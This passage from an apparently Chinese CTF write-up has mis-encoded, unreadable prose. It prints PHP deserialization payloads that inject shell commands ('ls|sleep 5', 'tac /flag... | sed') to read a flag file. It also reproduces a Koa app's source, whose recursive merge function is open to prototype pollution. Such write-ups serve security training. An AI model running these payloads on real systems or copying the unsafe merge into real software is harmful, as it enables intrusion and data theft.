class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code=&#x27;ls|sleep 5&#x27;;//ä¼šä½¿ç½‘é¡µå»¶è¿Ÿ5ç§’<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°ç½‘é¡µå»¶è¿Ÿå›æ˜¾ï¼Œè¯´æ˜æˆ‘ä»¬ä¸Šä¼ çš„payloadå‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œ</p><p><strong>sedç®¡é“å‘½ä»¤æ‰§è¡Œ:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;<br>å°†|ä¹‹å‰å‘½ä»¤æ‰§è¡Œçš„ç»“æœçš„1-20è¡Œå†…å®¹å†™å…¥testæ–‡ä»¶ä¸­ï¼Œtest&lt;=&gt;./test,æ‰€ä»¥testæ–‡ä»¶å­˜åœ¨äºå½“å‰ç½‘é¡µçš„æ–‡ä»¶å¤¹ä¸­<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code = &quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;<br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231031192813120.png" alt="image-20231031192813120"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231013111032145.png" alt="image-20231013111032145"></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>è¯¥é¢˜æä¾›äº†ç½‘é¡µçš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥ä»ç½‘é¡µçš„æºç ä¸­è¿›è¡Œåˆ†æ:<br><img src="/images/2023-11-3-newstar-3/image-20231028152657729.png" alt="image-20231028152657729"></p><p>æºç ä¸­å­˜åœ¨è·¯ç”±æ–‡ä»¶å¤¹ï¼Œå…ˆæŸ¥çœ‹ç½‘é¡µçš„å…·ä½“è¿è¡Œé€»è¾‘æ˜¯ä»€ä¹ˆï¼Œå³ä»ç½‘é¡µçš„è·¯ç”±å¼€å§‹åˆ†æ:</p><p>submit.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Base58</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;base-58&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALPHABET</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndText</span> = (<span class="hljs-params">length</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(&#123; length &#125;, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable constant_">ALPHABET</span>[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable constant_">ALPHABET</span>.<span class="hljs-property">length</span>)]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">timeText</span> = (<span class="hljs-params">timestamp</span>) =&gt; &#123;<br>    timestamp = (<span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">let</span> text1 = timestamp.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">let</span> text2 = timestamp.<span class="hljs-title function_">substring</span>(timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">let</span> text = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; text1.<span class="hljs-property">length</span>; i++)<br>        text += text1[i] + text2[text2.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i];<br>    <span class="hljs-keyword">if</span> (text2.<span class="hljs-property">length</span> &gt; text1.<span class="hljs-property">length</span>) text += text2[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Base58</span>.<span class="hljs-title function_">encode</span>(<span class="hljs-title function_">rndText</span>(<span class="hljs-number">3</span>) + <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(text)); <span class="hljs-comment">// length = 20</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndID</span> = (<span class="hljs-params">length, timestamp</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">timeText</span>(timestamp);<br>    <span class="hljs-keyword">if</span> (length &lt; t.<span class="hljs-property">length</span>) <span class="hljs-keyword">return</span> t.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, length);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> t + <span class="hljs-title function_">rndText</span>(length - t.<span class="hljs-property">length</span>);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-keyword">let</span> date = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;date&quot;</span>]),<br>        place = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;place&quot;</span>]),<br>        contact = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;contact&quot;</span>]),<br>        reason = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;reason&quot;</span>]);<br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-keyword">const</span> wishid = <span class="hljs-title function_">rndID</span>(<span class="hljs-number">24</span>, timestamp);<br>    <span class="hljs-comment">//å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ’å…¥æ•°æ®åº“ä¸­</span><br>    <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">run</span>(<span class="hljs-string">`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`</span>, [wishid, date, place, contact, reason, timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-comment">//åœ¨jsä¸­å¦‚æœå¯¹è±¡æ—¶jsonç±»å‹å³const data=&#123;&#125;,åˆ™è¯¥dataå¯¹è±¡çš„ç±»å‹å°±ä¸ºobjectï¼Œå¦åˆ™å°±ä¸æ˜¯ï¼Œè¿”å›dstæ‰€ä»£è¡¨çš„å€¼</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//è·å–srcä¸­çš„é”®</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//å¦‚æœé”®å­˜åœ¨äºä¸¤ä¸ªå¯¹è±¡ä¸­åˆ™è¿›è¡Œåˆå¹¶</span><br>            <span class="hljs-comment">//å°†ä¸¤ä¸ªå¯¹è±¡æ‰€å¯¹åº”çš„keyçš„valueè¿›è¡Œåˆå¹¶ï¼Œè¿”å›ç»™dstå¯¹è±¡</span><br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//å¦‚æœdstå¯¹è±¡ä¸­ä¸å­˜åœ¨è¯¥é”®å€¼ï¼Œåˆ™æ·»åŠ ä¸Šè¯¥é”®å€¼</span><br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æ‰€ä»¥æœ€ç»ˆè¯¥ä»£ç æ·»åŠ ä¸Šdstä¸­æ²¡æœ‰srcä¸­æœ‰çš„é”®å€¼å†…å®¹ç»™dst,ä¿æŒä¸¤è€…éƒ½æœ‰çš„å†…å®¹åœ¨dstä¸­ä¸å˜</span><br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><br><span class="hljs-comment">//ç½‘é¡µä»¥postè¯·æ±‚çš„æ–¹å¼è®¿é—®/submitåœ°å€æ—¶,atxå­˜å‚¨äº†è¯·æ±‚å’Œå“åº”çš„ä¿¡æ¯</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/submit&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­ï¼Œä¼ è¾“ç±»å‹æ˜¯å¦æ˜¯application/json</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/json&quot;</span>)<br>    <span class="hljs-comment">//è¿”å›ä¸€ä¸ªä»¥jsonæ•°æ®ä¸ºæ ¼å¼çš„å“åº”å†…å®¹</span><br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/json&quot;</span><br>        &#125;<br>        <span class="hljs-comment">//è·å–è¯·æ±‚ä½“ä¸­çš„jsonä¸»ä½“å†…å®¹</span><br>    <span class="hljs-keyword">const</span> jsonText = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">rawBody</span> || <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//å°†è·å–çš„æ•°æ®è½¬åŒ–ä¸ºjsæ‰€å¯ä»¥ä½¿ç”¨çš„jsonæ•°æ®ï¼Œå¯ä»¥ç†è§£ä¸ºè½¬åŒ–ä¸ºå­—å…¸ç±»å‹çš„æ•°æ®</span><br>        <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonText);<br>        <span class="hljs-comment">//åˆ¤æ–­jsonæ•°æ®dataä¸­contactå¥æ‰€å¯¹åº”çš„valueçš„ç±»å‹ä»¥åŠreasonæ‰€å¯¹åº”å¾—ç±»å‹æ˜¯ä¸æ˜¯ä¸ºstring(å­—ç¬¦ä¸²)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;contact&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;reason&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span>)<br>        <span class="hljs-comment">//å¦‚æœå…¶ä¸­æœ‰ä¸€ä¸ªä¼ è¾“ç±»å‹ä¸æ˜¯å­—ç¬¦ä¸²å°±è¾“å‡ºé”™è¯¯çš„å“åº”åŒ…</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//åˆ¤æ–­dataä¸­contactå’Œreasonæ‰€å¯¹åº”çš„å†…å®¹çš„å€¼æ˜¯å¦ä¸ºç©º</span><br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-string">&quot;contact&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span> || data[<span class="hljs-string">&quot;reason&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-comment">//å¦‚æœä¸¤è€…æ‰€å¯¹åº”å¾—å†…å®¹ä¸ºç©ºï¼Œåˆ™è¿”å›é”™è¯¯å¾—å“åº”å†…å®¹ä¸»ä½“</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Parameters contact and reason cannot be empty&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT</span> = &#123;<br>                <span class="hljs-attr">date</span>: <span class="hljs-string">&quot;unknown&quot;</span>,<br>                <span class="hljs-attr">place</span>: <span class="hljs-string">&quot;unknown&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//è°ƒç”¨insert2dbå‡½æ•°å°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: result<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>info.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-comment">//å¼•ç”¨é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä½¿å½“å‰ä»£ç è·å–å¼•ç”¨æ–‡ä»¶ä¸­çš„ä¿¡æ¯</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<br>    <span class="hljs-comment">//å¦‚æœtimestampç±»å‹ä¸ºnumberå‹ï¼ˆæ•°å€¼å‹ï¼‰ï¼Œåˆ™è¿”å›timestampçš„å€¼ï¼Œå¦åˆ™å°±ä¸ºå½“å‰æ—¶é—´çš„å€¼</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-comment">//è·å–æ—¶é—´æˆ³ä¿¡æ¯ï¼Œå¦‚æœCONFIG.min_public_timeçš„æ—¶é—´ä¸ºçœŸåˆ™ä»¥å®ƒä½œä¸ºå¯¹è±¡ç”³è¯·æ—¶çš„å‚æ•°</span><br>    <span class="hljs-comment">//å¦åˆ™å°±ä»¥DEFAULT_CONFIG.min_public_timeä½œä¸ºæ—¶é—´å¯¹è±¡çš„å‚æ•°ï¼Œgettime()è·å–dateç±»çš„æ—¶é—´æˆ³</span><br>    <span class="hljs-comment">//è¿™é‡Œçš„CONFIGï¼ŒDEFAULT_CONFIGéƒ½å±äºå¼•ç”¨æ–‡ä»¶ï¼Œæ‰€ä»¥è·å–çš„æ˜¯å¼•ç”¨çš„é…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br>    <span class="hljs-comment">//timestampè·å–timestampå’ŒminTimestampä¸­æœ€å¤§çš„é‚£ä¸€ä¸ªæ—¶é—´æˆ³çš„å€¼</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br>    <span class="hljs-comment">//è·å–æ•°æ®åº“ä¸­æ—¶é—´æˆ³å¤§äºtimestampçš„è®°å½•å†…å®¹</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><span class="hljs-comment">//ä½¿ç”¨postè¯·æ±‚è®¿é—®/infoç½‘é¡µï¼Œ:è¡¨ç¤ºè®¿é—®è¯¥ç½‘é¡µæ—¶è·å–å‚æ•°å†…å®¹,tsä¸ºå‚æ•°éƒ¨åˆ†ï¼Œ?è¡¨ç¤ºè¯¥å‚æ•°å¯ä»¥å¡«å†™ä¹Ÿå¯ä»¥ä¸å¡«å†™</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­è¯·æ±‚å†…å®¹å¾—ç±»å‹æ˜¯ä¸æ˜¯application/x-www-form-urlencoded</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//è·å–è¯·æ±‚å†…å®¹ä¸­çš„å‚æ•°é›†ä¸­çš„å‚æ•°tsçš„å€¼çš„ç±»å‹</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>)<br>        ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span> <span class="hljs-comment">//tså‚æ•°é»˜è®¤æ˜¯0</span><br>        <span class="hljs-comment">// /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;):å…ˆè¿è¡Œtest()ä¸­çš„å†…å®¹ï¼Œå¦‚æœtsä¸ºç©ºåˆ™è¢«èµ‹å€¼ä¸º&quot;&quot;,åŒæ—¶åˆ¤æ–­æ˜¯å¦ç”±æ•°å­—ç»„æˆ</span><br>        <span class="hljs-comment">//å¦‚æœç”±æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²åˆ™è¿”å›Number(ctx.params.ts)ï¼Œå°†tsè½¬åŒ–ä¸ºæ•°å€¼å‹çš„ç»“æœ</span><br>        <span class="hljs-comment">//å¦‚æœä¸æ˜¯ç”±æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›åŸæ¥tsçš„å†…å®¹</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-comment">//å¦‚æœtimestampç±»å‹ä¸ä¸ºæ•°å€¼å‹</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-comment">//dataä¸ºä»æ•°æ®åº“ä¸­è¿”å›çš„æ‰€æœ‰è®°å½•æ•°å†…å®¹</span><br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>æ ¹æ®info.jsçš„ä»£ç 